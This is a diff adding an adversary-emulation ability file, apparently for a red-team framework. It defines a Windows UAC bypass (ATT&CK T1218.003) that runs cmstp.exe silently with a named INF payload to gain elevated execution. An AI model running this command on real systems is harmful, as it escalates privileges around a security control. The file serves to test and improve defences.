@@ -1,0 +1,18 @@
+---
+- id: a4119e157f634fb23dcfb271688e77c3
+  name: CMSTP Executing UAC Bypass
+  description: 'Adversaries may invoke cmd.exe (or other malicious commands) by embedding
+    them in the RunPreSetupCommandsSection of an INF file
+
+    '
+  tactic: stealth
+  technique:
+    attack_id: T1218.003
+    name: 'Signed Binary Proxy Execution: CMSTP'
+  platforms:
+    windows:
+      cmd:
+        command: cmstp.exe /s "b27341_T1218.003_uacbypass.inf" /au
+        payloads:
+        - b27341_T1218.003_uacbypass.inf
+        cleanup: ''
